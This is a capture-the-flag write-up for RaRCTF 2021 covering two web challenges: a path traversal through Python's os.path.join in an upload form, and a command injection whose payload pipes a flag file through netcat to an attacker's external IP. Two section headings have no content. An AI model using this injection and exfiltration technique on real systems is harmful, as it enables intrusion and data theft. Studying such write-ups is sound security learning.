# RaRCTF2021

## verybabyrev


## Secure Uploader

After source code analysis we find the vulnerable part of the application:

![Capture](https://user-images.githubusercontent.com/52963102/129102595-7268dcfd-2b91-4d49-9817-e9eeae7121f3.PNG)

From the docs we know that _os.path.join_ discards all previous parts if a path segment begins with / so we just intercept the traffic with BurpSuite and change the filename:

![Capture](https://user-images.githubusercontent.com/52963102/129102789-d6e6ce84-1b61-4047-82f4-242d7864128d.PNG)

<code>rarctf{4lw4y5_r34d_th3_d0c5_pr0p3rly!-71ed16}</code>

## lemonthinker

During the CTF I managed to figure out the vulnerable part of the application, but after pondering on it for around 5h I didn't get too much further than that. So from the source code we see that our input on the website isn't properly validated, the only thing the code does is remove double quotes:

![1](https://user-images.githubusercontent.com/52963102/129076307-6eab48f9-d55d-40a2-a940-fdb651f35ca6.PNG)

Honestly I'm not 100% sure why the program actually executes the input code, because it's only supposed to draw it on the image, but an example of printing is here:

![1](https://user-images.githubusercontent.com/52963102/129077222-d454259f-fa0e-4cde-b32d-89bf44fb55c6.PNG)

(_test.py_ and _test2.py_ used for testing can be found in the repo)

Now the flag itself is in _../flag.txt_ and because of the _noleek.png_ being a thing, we can't just cat the flag out. A clever solution that I found was using netcat on your device with portforwarding and then using this as the injection:

``` bash
$(rev ../flag.txt | nc <EXTERNAL_IP> <PORT>)
```
	
And then opening the port with <code>nc -lvp PORT</code> and forwarding it we get the flag:

<code>rarctf{b451c-c0mm4nd_1nj3ct10n_f0r-y0u_4nd_y0ur-l3m0nth1nk3rs_d8d21128bf}</code>

## Fancy Button Generator
